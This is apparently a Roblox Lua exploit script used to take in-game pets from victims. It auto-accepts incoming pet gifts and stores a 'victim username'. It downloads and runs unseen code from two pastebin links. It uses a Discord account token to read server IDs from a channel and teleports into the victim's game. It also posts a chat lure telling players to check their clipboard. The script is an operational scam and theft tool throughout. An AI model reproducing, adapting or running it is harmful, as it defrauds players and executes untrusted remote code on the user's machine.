if not game:IsLoaded() then 
	game.Loaded:Wait()
end

-- Services needed for the focus mimic
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Function to check and print focus status (always reports "IN FOCUS")
local function checkActivityStatus()
    print("Roblox window is IN FOCUS.")
end

-- Periodically update the status to always be "in focus" in the console.
RunService.Heartbeat:Connect(function()
    local currentStatusIsInactive = false 
    local lastStatus = _G.RobloxFocusStatus 

    if lastStatus == nil then 
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    elseif (currentStatusIsInactive and not lastStatus) or (not currentStatusIsInactive and lastStatus) then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    end
end)

-- Initial check when the script starts for console output
checkActivityStatus()

-- NEW: Auto-accept gift logic with whitelist
local autoAccept_RS = game:GetService("ReplicatedStorage")
local autoAccept_GameEvents = autoAccept_RS:WaitForChild("GameEvents", 10) -- Added timeout for robustness
if autoAccept_GameEvents then -- Only proceed if GameEvents is found
    local autoAccept_GiftPet = autoAccept_GameEvents:WaitForChild("GiftPet", 10)
    local autoAccept_AcceptPetGift = autoAccept_GameEvents:WaitForChild("AcceptPetGift", 10)

    if autoAccept_GiftPet and autoAccept_AcceptPetGift then
        print("Auto-Accept Script: Hooked and ready. Waiting for gifts...")

        autoAccept_GiftPet.OnClientEvent:Connect(function(e_giftId, f_petFullName, g_senderName)
            -- Extract just the pet name, removing "[KG]" or "[Age]" parts
            local petName = f_petFullName:match("^(.-) %[") or f_petFullName -- Get everything before first '[' or the whole string
            petName = petName:gsub("^%s+", ""):gsub("%s+$", "") -- Trim leading/trailing whitespace

            -- Check if the extracted petName exists in the PETS_TO_CLAIM list
            if table.find(PETS_TO_CLAIM, petName) then
                print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...",f_petFullName,g_senderName))
                pcall(function()
                    autoAccept_AcceptPetGift:FireServer(true,e_giftId)
                    print("Auto-Accept: Successfully accepted gift with ID: "..tostring(e_giftId))
                end)
            else
                print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).",f_petFullName,g_senderName))
            end
        end)
    else
        print("Auto-Accept Script: Could not find GiftPet or AcceptPetGift RemoteEvents.")
    end
else
    print("Auto-Accept Script: Could not find GameEvents folder.")
end


if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()


local bb = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("user_gag.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user_gag.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]")
end
local victimUser = readfile("user_gag.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0
local lastMessageId = nil

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

local function waitForPlayerLeave()
    local connection
    connection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if connection then
                connection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

waitForPlayerLeave()

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

while plr:GetAttribute("DataFullyLoaded") ~= true do
    plr:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while plr:GetAttribute("Finished_Loading") ~= true do
    plr:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while plr:GetAttribute("Loading_Screen_Finished") ~= true do
    plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end

wait(1)
local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")

local function acceptGifts()
    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA("ImageLabel") then
                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(acceptImageButton.MouseButton1Click)
            end
        end
    end
end

task.spawn(acceptGifts)

wait(0.5)

game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
wait(0.5)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('GGS')

local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ['Content-Type'] = 'application/json'
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then return end

        local message = messages[1]
        if message.id == lastMessageId or table.find(joinedIds, tostring(message.id)) then return end

        local content = message.content or ""
        local placeId, jobId = string.match(content, "TeleportToPlaceInstance%((%d+),%s*['\"]([%w%-]+)['\"]%)")
        if placeId and jobId then
            lastMessageId = message.id
            saveJoinedId(tostring(message.id))
            writefile("user_gag.txt", "unknown")
            game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
        end
    else
        print("Invalid response code:", response.StatusCode)
    end
end

while task.wait(5) do
    autoJoin()
end
